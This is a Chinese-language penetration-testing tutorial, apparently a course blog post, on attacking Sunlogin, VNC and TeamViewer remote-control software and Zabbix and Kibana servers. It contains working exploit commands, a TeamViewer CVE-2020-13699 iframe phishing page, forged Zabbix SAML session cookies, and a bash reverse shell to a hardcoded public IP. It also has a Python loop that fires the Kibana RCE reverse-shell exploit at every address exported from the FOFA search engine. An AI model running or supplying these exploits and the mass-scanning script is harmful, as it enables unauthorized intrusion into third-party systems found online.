![1649998514042-2f6e02d3-4d2d-489e-b142-207bac995a38.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134330955-1473316938.png)

```plain
#知识点：
1、远程控制-第三方应用安全
2、三方应用-向日葵&VNC&TV
3、设备平台-Zabbix&Kibana漏洞

#章节内容：
常见服务应用的安全测试：
1、配置不当-未授权访问
2、安全机制-特定安全漏洞
3、安全机制-弱口令爆破攻击

#前置知识：
应用服务安全测试流程：见图
1、判断服务开放情况-端口扫描&组合应用等
2、判断服务类型归属-数据库&文件传输&通讯等
3、判断服务利用方式-特定漏洞&未授权&弱口令等
```

- 远程控制-向日葵&Vnc&Teamviewer

向日葵

```plain
使用工具xrkRce.exe
项目地址：https://github.com/Mr-xn/sunlogin_rce


使用：
xrkRce.exe -h 192.168.233.140 -t scan
xrkRce.exe -h 192.168.233.140 -t rce -p 49516 -c "ipconfig"
```

![1650072356940-0eb5c14d-27bc-420c-927a-a0e063c5d924.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134406732-1656937184.png)

Vnc

```plain
在使用的过程中有两个问题：
在security中有设置选项，这个就是设置安全的。
如果设置为none，则就不需要密码就可以直接连接这个主机

安全中有几种模式：Windows password，VNC password，None
```

![1650071340784-1263bf57-7610-47bd-89fd-3e943839a045.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134406661-688533523.png)

```plain
用客户端去连接这台主机，并不用输入账号密码，就可以直接连接

也可在fofa中搜：app="VNC"&port="5900"

这个密码是可以参加的，在hydra中是支持这个vnc猜解的。没有账号。
```

![1650071702408-ad209eff-64bb-4727-95ef-1a08f487f7ed.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134407423-506499371.png)

Teamviewer

```plain
这个类似于网站钓鱼，需要管理员访问特定的地址（我们构造的）

构造的html代码：
<!DOCTYPE html>
<html>
<head>
    <title>cve-2020-13699</title>
</head>
<body>
    <p>Welcome to xiaodi!</p>
    <iframe style="height:1px;width:1px;" src='teamviewer10: --play \\attacker-IP\share\fake.tvs'></iframe>
</body>
</html>


当管理员去访问：http://192.168.233.1:8081/web/test.html
这个时候就会自动运行这个软件。

teamviewer10: --play \\attacker-IP\share\fake.tvs是执行命令，如果要执行什么就可以进行修改完成测试。
```

![1650080710515-273178af-9f14-4cb9-aec7-e9a4a815f90d.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134407921-649024698.png)

- 设备平台-Zabbix-CVE-2022-23131

```plain
Zabbix 是由Alexei Vladishev 开发的一种网络监视、管理系统，基于 Server-Client 架构。是一款服务器监控软件，其由server、agent、web等模块组成，其中web模块由PHP编写，用来显示数据库中的结果。默认端口：10051
为了更好的维护服务器，在蓝队的使用的比较多。


Zabbix CVE-2022-23131 登录绕过漏洞复现
https://github.com/L0ading-x/cve-2022-23131
20.188.
搜索：app="ZABBIX-监控系统"


手工演示：https://www.cnblogs.com/backlion/p/15958470.html
打开网站，点击检查元素，在点击（SAML）
```

![1650081645004-1ffb4151-23eb-414a-a8a4-1e4f6b14dbb7.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134407281-543545589.png)

```plain
抓取数据包，数据包里面有cookie
197.129/
zbx_session=eyJzZXNzaW9uaWQiOiJjMzYzNThhZDQ4ZjM3ODRmMjg2ZWI1N2E2N2QyZjMwMSIsInNpZ24iOiJDcnFaXC92dUpkOHg2bjB2cWI2R1BTZElkdG93RGtoNnNmOE9cL2ZiVXI2SXkxcjZlXC92MWM2Z0wwbW1Gb2xaN3NWenA4RGUwWUt1NWJQWFwvT05waHRuWEE9PSJ9; path=/; domain=xxx; HttpOnly
```

![1650081858089-f532001a-ee51-44c4-a57e-1c3dff7462a0.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134406881-1248824718.png)

```plain
对cookie的值进行解码：{"sessionid":"c36358ad48f3784f286eb57a67d2f301","sign":"CrqZ\/vuJd8x6n0vqb6GPSdIdtowDkh6sf8O\/fbUr6Iy1r6e\/v1c6gL0mmFolZ7sVzp8De0YKu5bPX\/ONphtnXA=="}

然后对这个值进行组合：{"saml_data":{"username_attribute":"Admin"},{"sessionid":"c36358ad48f3784f286eb57a67d2f301","sign":"CrqZ\/vuJd8x6n0vqb6GPSdIdtowDkh6sf8O\/fbUr6Iy1r6e\/v1c6gL0mmFolZ7sVzp8De0YKu5bPX\/ONphtnXA=="}

然后在进行base64编码，放到cookie里就可以实现了：eyJzYW1sX2RhdGEiOnsidXNlcm5hbWVfYXR0cmlidXRlIjoiQWRtaW4ifSx7InNlc3Npb25pZCI6ImMzNjM1OGFkNDhmMzc4NGYyODZlYjU3YTY3ZDJmMzAxIiwic2lnbiI6IkNycVpcL3Z1SmQ4eDZuMHZxYjZHUFNkSWR0b3dEa2g2c2Y4T1wvZmJVcjZJeTFyNmVcL3YxYzZnTDBtbUZvbFo3c1Z6cDhEZTBZS3U1YlBYXC9PTnBodG5YQT09In0=
```

![1650082591354-c0cf9470-f9dd-45f1-8be0-9cfd74f5ce69.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134406967-554594161.png)

```plain
然后重新点击登录，就可以完成测试，直接进入了后台。但是这里我没有成功，不知道是不是获取的cookie值不对。

也可以直接用工具：G:\python38\python.exe cve-2022-23131.py http://xxxx Admin
```

![1650083393179-83e7d9d8-4a83-42e7-a8a0-93f2559ea96e.jpeg](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134407198-370275076.jpg)

```plain
获得cookie值：decode_payload: {"saml_data": {"username_attribute": "Admin"}, "sessionid": "ebaf06e35b9ecce56355d74c9f7aa82b", "sign": "BrvvCJyqu0vrfM9zx8F/CSCZwqaYlSqLSQ8R1ODssHisRyLpUmJJK2nglpciJs7Lzp8De0YKu5bPX/ONphtnXA=="}
zbx_signed_session: eyJzYW1sX2RhdGEiOiB7InVzZXJuYW1lX2F0dHJpYnV0ZSI6ICJBZG1pbiJ9LCAic2Vzc2lvbmlkIjogImViYWYwNmUzNWI5ZWNjZTU2MzU1ZDc0YzlmN2FhODJiIiwgInNpZ24iOiAiQnJ2dkNKeXF1MHZyZk05eng4Ri9DU0Nad3FhWWxTcUxTUThSMU9Ec3NIaXNSeUxwVW1KSksybmdscGNpSnM3THpwOERlMFlLdTViUFgvT05waHRuWEE9PSJ9

修改完成后，点击（SAML）就能进行登录了。
```

![1650083598035-54856d3b-dcd1-4a6e-baec-4da1033fba37.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134407097-169340056.png)

```plain
后续利用：提权等等

在功能点中（administrator）下有一个script，点击create script（创建一个脚本）
写一个反弹命令的脚本bash -i >& /dev/tcp/175.178.151.29/5566 0>&1

在Monitoring中有一个Maps，选中他监控的主机，然后选中刚刚添加的脚本
在服务器上监听这个端口执行获取权限。
CVE-2017-2824 
利用条件比较苛刻，需要登录进行设置一个东西才能实现。
CVE-2020-11800
```

- 设备平台-Kibana-CVE-2019-7609

```plain
Kibana为Elassticsearch设计的一款开源的视图工具。其5.6.15和6.6.1之前的版本中存在一处原型链污染漏洞，利用漏洞可以在目标服务器上执行任意代码。默认端口：5601

fofa：port="5601"

参考：https://blog.csdn.net/zy15667076526/article/details/109706962

可以直接利用到工具：https://github.com/LandGrey/CVE-2019-7609
在虚拟机中运行：
命令：python2 CVE-2019-7609-kibana-rce.py -u http://45.233.129.129:5601 -host 175.178.151.29 -port 5566 --shell
```

![1650085657219-d634bfe4-f511-4b69-b7e0-0290b21e2a0c.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134407697-1897315934.png)

```plain
利用fofa来进行导出数据，然后写python脚本来进行批量测试，


import os
for ip in open('ips.txt'):
	ip=ip.strip()
	cmdline='python CVE-2019-7609-kibana-rce.py -u http://%s:5601 -host 175.178.151.29 -port 5566 --shell'%ip
	print(cmdline)
	os.system(cmdline)
	#print(ip)


然后再用python3去运行这个脚本，就可以完成测试
```

![1650086686542-8919f80b-6ddf-473b-82e9-6864136fb914.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134407253-2009915923.png)